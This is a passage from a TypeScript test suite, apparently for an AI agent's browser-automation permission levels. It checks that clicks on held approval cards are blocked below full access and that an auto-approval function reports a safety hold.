    expect(b.cards).toHaveLength(3);
    expect(b.ran).toEqual([]);
  });

  it("below Full the card comes as before; Approve for me reads it as a safety hold on any other card", async () => {
    for (const level of ["ask", "edits", "custom", "auto"] as const) {
      const b = browser(level);
      for (const [ref] of HELD) expect((await b.click(ref)).isError, `${level} ${ref}`).toBe(true);
      expect(b.cards, level).toHaveLength(3);
      expect(b.record, level).toEqual([]);
      expect(myChromeLevelAnswers(level), level).toBe(false);
    }
    // the same answer Approve for me gives a held permission card
    expect(autoVerdict("auto", "other", { safetyHold: true, toolName: "my_chrome:agent_browser_click" })).toEqual({ approve: null, source: "safety-hold" });
    expect(autoVerdict("full", "other", { safetyHold: true, toolName: "my_chrome:agent_browser_click" })).toMatchObject({ source: "full-access" });
  });
});
